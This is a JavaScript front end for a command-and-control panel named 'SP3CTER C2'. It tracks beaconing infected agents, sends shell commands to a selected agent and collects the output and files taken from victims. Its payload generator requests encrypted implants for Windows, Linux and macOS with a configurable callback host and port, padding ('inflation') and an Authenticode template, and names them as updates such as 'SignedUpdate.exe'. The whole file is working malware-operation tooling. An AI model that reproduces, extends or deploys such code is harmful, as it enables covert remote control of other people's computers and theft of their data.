// === RUTINA DE SESIÓN MULTI-OPERADOR (NUEVA) ===
// Genera una firma única por navegador si no existe para individualizar las consultas
if (!localStorage.getItem('zentryx_operator_id')) {
    const randomHex = Math.random().toString(16).substring(2, 10);
    localStorage.setItem('zentryx_operator_id', `op_${randomHex}`);
}
const myOperatorId = localStorage.getItem('zentryx_operator_id');
let openAgents = new Set(); 
/* =========================
   SP3CTER COMMAND CENTER
   app.js
========================= */

document.addEventListener("DOMContentLoaded", () => {
  updateClock();
  setInterval(updateClock, 1000);

  seedConsole();

  //setInterval(updateMetrics, 2500);

  animateBars();
  pulseActiveAgent();
});

/* =========================
   CLOCK
========================= */
function updateClock() {
  const clock = document.querySelector(".clock");
  if (!clock) return;

  const now = new Date();
  const h = String(now.getHours()).padStart(2, "0");
  const m = String(now.getMinutes()).padStart(2, "0");

  clock.textContent = `${h}:${m}`;
}

/* =========================
   METRICS
========================= */
function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function updateMetrics() {
  const bigs = document.querySelectorAll(".metric-big");

  if (bigs[0]) {
    const n = rand(7, 10);
    bigs[0].innerHTML = `${n} <span>/ 10</span>`;
  }

  if (bigs[1]) {
    const n = rand(5, 10);
    bigs[1].innerHTML = `${n} <span>/ 10</span>`;
  }

  if (bigs[2]) {
    const n = rand(1, 5);
    bigs[2].innerHTML = `${n}`;
  }
}

function seedConsole() {
  const pre = document.querySelector(".console pre");
  if (!pre) return;

  // Borramos todo el texto de ejemplo y dejamos solo el inicio del sistema
  pre.textContent = `[SYSTEM] SP3CTER C2 CORE ONLINE...
[SYSTEM] Waiting for operator commands...`;
}

/* =========================
   CONSOLA REAL (ACTUALIZADA)
========================= */
function pushLog(msg, isHtml = false) {
  const pre = document.querySelector(".console pre");
  if (!pre) return;

  if (!msg) return;

  // Si es HTML (para el enlace), usamos innerHTML; si no, mantenemos la seguridad
  if (isHtml) {
    pre.innerHTML += `\n${msg}`;
  } else {
    pre.textContent += `\n${msg}`;
  }

  // Se eliminó la guillotina de 25 líneas para conservar todo el historial al scrolear

  pre.scrollTop = pre.scrollHeight;
}


/* =========================
   AGENT BARS
========================= */
function animateBars() {
  const bars = document.querySelectorAll(".agent-bar span");

  bars.forEach(bar => {
    setRandomBar(bar);

    setInterval(() => {
      setRandomBar(bar);
    }, rand(1800, 4000));
  });
}

function setRandomBar(bar) {
  const width = rand(35, 92);
  bar.style.transition = "width .8s ease";
  bar.style.width = width + "%";
}

/* =========================
   ACTIVE AGENT PULSE
========================= */
function pulseActiveAgent() {
  const active = document.querySelector(".agent.active");
  if (!active) return;

  let on = true;

  setInterval(() => {
    active.style.boxShadow = on
      ? "0 0 35px rgba(68,184,255,.15), inset 0 0 0 1px rgba(255,255,255,.04)"
      : "0 0 12px rgba(68,184,255,.05), inset 0 0 0 1px rgba(255,255,255,.02)";

    on = !on;
  }, 900);
}

async function syncAgents() {
    try {
        const res = await fetch('/api/v1/operator/list');
        const agents = await res.json();
        
        const container = document.querySelector('.agents-list');
        if (!container) return;

        const ids = Object.keys(agents);
        
        // 1. Gestionar MISSION STATUS
        const statusText = document.querySelector('.metric-card:nth-child(1) .metric-main');
        const statusDesc = document.querySelector('.metric-card:nth-child(1) p');
        if (ids.length > 0) {
            if (statusText) { statusText.innerText = "OPERATIONAL"; statusText.classList.add('green-text'); }
            if (statusDesc) statusDesc.innerText = "All systems nominal";
        } else {
            if (statusText) { statusText.innerText = "IDLE"; statusText.classList.remove('green-text'); }
            if (statusDesc) statusDesc.innerText = "Waiting for beacons...";
        }

        // 2. Gestionar ACTIVE BEACONS
        const beaconCount = document.getElementById('beacon-count-big') || document.querySelector('.metric-card:nth-child(2) .metric-big');
        if (beaconCount) {
            beaconCount.innerHTML = `${ids.length} <span>/ 10</span>`;
        }

        // 3. Gestionar ONLINE AGENTS
        const onlineAgents = document.querySelector('.metric-card:nth-child(3) .metric-big');
        if (onlineAgents) {
            onlineAgents.innerHTML = `${ids.length} <span>/ 10</span>`;
        }

        // 4. Gestionar ALERTS
        const alertCount = document.querySelector('.metric-card:nth-child(4) .metric-big');
        if (alertCount) {
            alertCount.innerText = (ids.length === 0) ? "1" : "0";
        }

        if (ids.length > 0) {
         let htmlBuffer = '';
            ids.forEach(id => {
            const a = agents[id];
            const displayStyle = openAgents.has(id) ? 'block' : 'none';

            htmlBuffer += `
            <div class="agent-wrapper" id="wrapper-${id}">
                <div class="agent green active" style="cursor: default;"> 
                    <div class="agent-color"></div>
                    <div class="agent-icon">💻</div>
                    <div class="agent-content">
                        <div class="agent-name">${a.hostname}</div>
                        <div class="agent-label ready">ONLINE</div>
                    </div>
                    
                    <div class="agent-play" onclick="selectAgent('${id}')" title="Interact">
                        <span style="margin-left: 2px;">▶</span>
                    </div>

                    <div class="agent-info" onclick="toggleDetails('${id}')">i</div>
                </div>
                <div class="agent-details" id="details-${id}" style="display:${displayStyle}; padding: 12px 15px 12px 42px; background: rgba(0,0,0,0.2); border-radius: 0 0 10px 10px; border-top: 1px solid rgba(255,255,255,0.03);">
                    <div class="detail-item" style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 6px; font-family: 'JetBrains Mono';">
                        <span style="color: #7f95a6;">🌐 IP LOCAL:</span> <b style="color: #fff;">${a.ip}</b>
                    </div>
                    <div class="detail-item" style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 6px; font-family: 'JetBrains Mono';">
                        <span style="color: #7f95a6;">🔌 PORT:</span> <b style="color: #fff;">5000</b>
                    </div>
                    <div class="detail-item" style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 6px; font-family: 'JetBrains Mono';">
                        <span style="color: #7f95a6;">🏗 ARCH:</span> <b style="color: #fff;">${a.arch || 'x64'}</b>
                    </div>
                    <div class="detail-item" style="display: flex; justify-content: space-between; font-size: 11px; font-family: 'JetBrains Mono';">
                        <span style="color: #7f95a6;">💻 OS:</span> <b style="color: #fff;">${a.os || 'Windows 10 Pro'}</b>
                    </div>
                </div>
            </div>`;
        });
        
        // Volcamos el buffer completo de golpe en el contenedor principal. Esto blinda las variables y estabiliza el DOM.
        container.innerHTML = htmlBuffer;
    }

    } catch (e) { 
        console.error("Fallo en Sync:", e); 
        const statusText = document.querySelector('.metric-card:nth-child(1) .metric-main');
        if (statusText) {
            statusText.innerText = "OFFLINE";
            statusText.style.color = "var(--red)";
        }
    }
}

// Ejecutar cada 3 segundos
setInterval(syncAgents, 3000);

/* ============================================================
   GENERADOR DE PAYLOADS AVANZADO MULTIPLATAFORMA
============================================================ */
document.addEventListener("DOMContentLoaded", () => {
    const osSelect = document.getElementById('v_os');
    const winOptions = document.getElementById('windows-options');
    const fileInput = document.getElementById('template_file');
    const fileNameDisplay = document.getElementById('file-name-display');

    if (osSelect && winOptions) {
        osSelect.addEventListener('change', (e) => {
            if (e.target.value === 'windows') {
                winOptions.style.display = 'block';
            } else {
                winOptions.style.display = 'none';
            }
        });
    }

    if (fileInput && fileNameDisplay) {
        fileInput.addEventListener('change', (e) => {
            const name = e.target.files && e.target.files[0] ? e.target.files[0].name : "";
            fileNameDisplay.innerText = name;
        });
    }
});

async function triggerPayloadGeneration() {
    const generateBtn = document.getElementById('btn-generate');
    const os = document.getElementById('v_os').value;
    const host = document.getElementById('v_host').value;
    const port = document.getElementById('v_port').value;
    const interval = document.getElementById('v_interval').value;
    const inflation = document.getElementById('v_inflation').value; // Nuevo campo de control
    const fileField = document.getElementById('template_file');
    const successMsg = document.getElementById('success-msg');

    if (!host || !port) {
        alert("Por favor introduce Host y Puerto de escucha.");
        return;
    }

    const statusBox = document.getElementById('generation-status-box');
    const pBar = document.getElementById('generation-progress-bar');
    const pPercent = document.getElementById('progress-percent');
    const pPhase = document.getElementById('progress-phase-text');
    const vConsole = document.getElementById('generation-verbose');

    if (successMsg) successMsg.style.display = 'none';
    // Forzamos visualización flex para activar el estiramiento vertical de la caja verbose hacia abajo
    if (statusBox) statusBox.style.display = 'flex'; 
    if (vConsole) vConsole.innerHTML = "";
    
    let originalText = "GENERATE & ENCRYPT";
    if (generateBtn) {
        originalText = generateBtn.innerText;
        generateBtn.innerText = "PROCESSING...";
        generateBtn.disabled = true;
    }

    const logVerbose = (text) => {
        const timestamp = new Date().toLocaleTimeString();
        if (vConsole) {
            vConsole.innerHTML += `[${timestamp}] ${text}\n`;
            vConsole.scrollTop = vConsole.scrollHeight;
        }
    };

    const updateProgress = (percent, phaseText) => {
        if (pBar) pBar.style.width = `${percent}%`;
        if (pPercent) pPercent.innerText = `${percent}%`;
        if (pPhase) pPhase.innerText = phaseText;
    };

    try {
        logVerbose(`Initiating compilation framework for target: ${os.toUpperCase()}`);
        updateProgress(15, "INITIALIZING...");
        await new Promise(r => setTimeout(r, 400));

        logVerbose(`Setting connection callback -> http://${host}:${port}`);
        logVerbose(`Setting beaconing heartbeat interval to: ${interval} seconds`);
        logVerbose(`Setting inflation target padding size to: ${inflation} MB`);
        updateProgress(40, "PARSING CONFIG...");
        await new Promise(r => setTimeout(r, 500));

        const formData = new FormData();
        formData.append('v_os', os);
        formData.append('v_host', host);
        formData.append('v_port', port);
        formData.append('v_interval', interval);
        formData.append('v_inflation', inflation); // Envío del buffer al backend

        if (os === 'windows' && fileField && fileField.files && fileField.files[0]) {
            formData.append('template_file', fileField.files[0]);
            logVerbose(`Authenticode template discovered: ${fileField.files[0].name}`);
        }
        
        updateProgress(65, "COMPILING SOURCE...");
        await new Promise(r => setTimeout(r, 600));

        logVerbose("Packaging encrypted binary payload layers...");
        updateProgress(80, "ENCRYPTING...");

        const response = await fetch('/generate', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            updateProgress(95, "FINALIZING ASSET...");
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            
            if (os === 'windows') a.download = "SignedUpdate.exe";
            else if (os === 'linux') a.download = "update.elf";
            else a.download = "update.macho";

            document.body.appendChild(a);
            a.click();
            a.remove();

            updateProgress(100, "FINISHED");
            logVerbose(`Payload compiled successfully. Delivered as: ${a.download}`);
            if (successMsg) {
                successMsg.style.display = 'block';
                successMsg.style.color = '#51d87d';
                successMsg.innerText = `Agent payload (${a.download}) successfully created and encrypted.`;
            }
        } else {
            logVerbose("[ERROR] Internal building pipeline returned an unhandled exception.");
            updateProgress(0, "BUILD FAILED");
        }
    } catch (err) {
        logVerbose(`[CRITICAL] Network error communicating with framework: ${err.message}`);
        updateProgress(0, "ERROR");
    } finally {
        if (generateBtn) {
            generateBtn.innerText = originalText;
            generateBtn.disabled = false;
        }
    }
}


/* ============================================================
   LÓGICA INTERACTIVA DE LA CONSOLA (PERSISTENCIA TOTAL F5 SAFE)
============================================================ */
// Recuperar de forma automática el ID del último agente activo tras un refresco (F5)
let currentAgentId = localStorage.getItem('last_active_agent_id') || null;

function selectAgent(id) {
    currentAgentId = id;
    // Guardar en disco el ID seleccionado para sobrevivir a recargas de página
    localStorage.setItem('last_active_agent_id', id);

    const targetEl = document.getElementById('active-target');
    const pathEl = document.getElementById('shell-path');
    
    if (targetEl) targetEl.innerText = `[TARGET: ${id}]`;
    if (pathEl) pathEl.innerText = `[${id}]`;
    
    const pre = document.querySelector(".console pre");
    if (pre) {
        const history = localStorage.getItem(`history_${id}`);
        if (history) {
            pre.innerHTML = history;
        } else {
            pre.textContent = `[SYSTEM] SP3CTER C2 CORE ONLINE...\n[SYSTEM] Switched session to Agent ${id}`;
        }
        // Desplazamiento inmediato al final del texto histórico recuperado
        pre.scrollTop = pre.scrollHeight;
    }
}

const shellInput = document.getElementById('shell-input');
if (shellInput) {
    shellInput.addEventListener('keypress', async (e) => {
        if (e.key === 'Enter') {
            const cmd = e.target.value;
            if (!currentAgentId) {
                pushLog("[ERROR] No agent selected.");
                e.target.value = '';
                return;
            }
            pushLog(`[SENT] ${cmd}`);
            e.target.value = '';
            
try {
    await fetch('/api/v1/operator/push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        // CAMBIO: Añadimos 'operator_id' al payload JSON enviado al backend
        body: JSON.stringify({ 
            id: currentAgentId, 
            cmd: cmd,
            operator_id: myOperatorId 
        })
    });
} catch (err) {
    pushLog("[ERROR] Communication failure.");
}
        }
    });
}

// Escuchar de forma periódica las respuestas devueltas por los agentes conectados
setInterval(async () => {
    if (!currentAgentId) return;
    try {
       const res = await fetch(`/api/v1/operator/results/${currentAgentId}?operator_id=${myOperatorId}`);
        const data = await res.json();
        
        if (data.files && data.files.length > 0) {
            data.files.forEach(fileName => {
                const downloadUrl = `/api/v1/operator/download_file/${currentAgentId}/${fileName}`;
                const fileLink = `<span style="color: var(--cyan)">[FILE-READY]</span> <a href="${downloadUrl}" download="${fileName}" style="color: #fff; text-decoration: underline; cursor: pointer;">Download: ${fileName}</a>`;
                pushLog(fileLink, true);
            });
        }
        
        if (data.results && data.results.length > 0) {
            data.results.forEach(result => {
                let textToProcess = result;
                try {
                    textToProcess = atob(result);
                } catch (e) {
                    textToProcess = result;
                }
                
                if (textToProcess.includes("---PATH---")) {
                    const parts = textToProcess.split("---PATH---");
                    const cleanOutput = (parts && parts[0]) ? parts[0].trim() : "";
                    const newPath = (parts && parts[1]) ? parts[1].trim() : "C:\\";
                    
                    if (cleanOutput) {
                        pushLog(`[REPORT]>\n${cleanOutput}\n\nDirectory: ${newPath}`);
                    } else {
                        pushLog(`Directory: ${newPath}`);
                    }
                    const shellPath = document.getElementById('shell-path');
                    if (shellPath) shellPath.innerText = newPath;
                } else {
                    pushLog(`[AGENT]> ${textToProcess}`);
                }
            });
        }
    } catch (e) {
        console.error("Error en el receptor:", e);
    }
}, 2000);

// Desplegar menú lateral de detalles del agente
function toggleDetails(id) {
    const details = document.getElementById(`details-${id}`);
    const wrapper = document.getElementById(`wrapper-${id}`);
    if (details) {
        if (details.style.display === 'none' || details.style.display === '') {
            details.style.display = 'block';
            if (wrapper) wrapper.style.borderColor = 'rgba(68, 184, 255, 0.3)';
            openAgents.add(id);
        } else {
            details.style.display = 'none';
            if (wrapper) wrapper.style.borderColor = 'rgba(255, 255, 255, 0.05)';
            openAgents.delete(id);
        }
    }
}

// Hook secundario seguro adjuntado a la función pushLog original con scroll automático
const basePushLog = pushLog;
pushLog = function(msg, isHtml = false) {
    basePushLog(msg, isHtml);
    const pre = document.querySelector(".console pre");
    if (currentAgentId && pre) {
        localStorage.setItem(`history_${currentAgentId}`, pre.innerHTML);
        // Garantizar el scroll al final con cada nueva línea que imprima la shell
        pre.scrollTop = pre.scrollHeight;
    }
};

// Disparador automático al cargar la página: Si había un agente activo, lo re-selecciona e inyecta su log
document.addEventListener("DOMContentLoaded", () => {
    if (currentAgentId) {
        // Un breve retraso controlado de 100ms para asegurar que el DOM de la lista de agentes ya se renderizó
        setTimeout(() => {
            selectAgent(currentAgentId);
        }, 100);
    }
});
